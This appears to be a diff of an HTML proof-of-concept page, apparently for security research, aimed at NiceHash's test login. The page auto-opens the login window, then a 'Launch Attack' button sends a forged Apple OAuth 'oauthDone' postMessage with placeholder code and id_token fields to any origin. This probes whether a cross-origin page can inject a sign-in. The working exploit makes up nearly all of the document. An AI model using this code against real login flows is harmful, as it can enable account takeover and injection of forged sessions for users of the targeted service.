@@ -1,9 +1,41 @@
+  <!DOCTYPE html>
+  <html>
   <body>
+  <button onclick="attack()">Launch Attack</button>
+  <div id="log"></div>
   <script>
-  document.addEventListener('click', () => {
-    window.open('https://chatgpt.com/s/69c7c15921f08191b7ba425445faa159');
-    window.location = 'https://chatgpt.com';
-  }, {once: true});
+  let nhWin;
+
+  function openTarget() {
+    nhWin = window.open('https://test.nicehash.com/my/login', 'nhLogin',
+      'width=600,height=700');
+    log('NiceHash login opened from: ' + window.location.origin);
+  }
+
+  function attack() {
+    // Paste fresh code + id_token here
+    const applePayload = {
+      method: 'oauthDone',
+      data: {
+        authorization: {
+          code: 'PASTE_FRESH_CODE_HERE',
+          id_token: 'PASTE_FRESH_ID_TOKEN_HERE',
+          state: 'login'
+        }
+      }
+    };
+
+    nhWin.postMessage(JSON.stringify(applePayload), '*');
+    log('[SENT] postMessage from ' + window.location.origin + ' → NiceHash');
+    log('Check NiceHash window Network tab for apple-callback response');
+  }
+
+  function log(msg) {
+    document.getElementById('log').innerHTML += '<p>' + msg + '</p>';
+  }
+
+  // Auto-open on load
+  openTarget();
   </script>
-  <p>Loading...</p>
   </body>
+  </html>
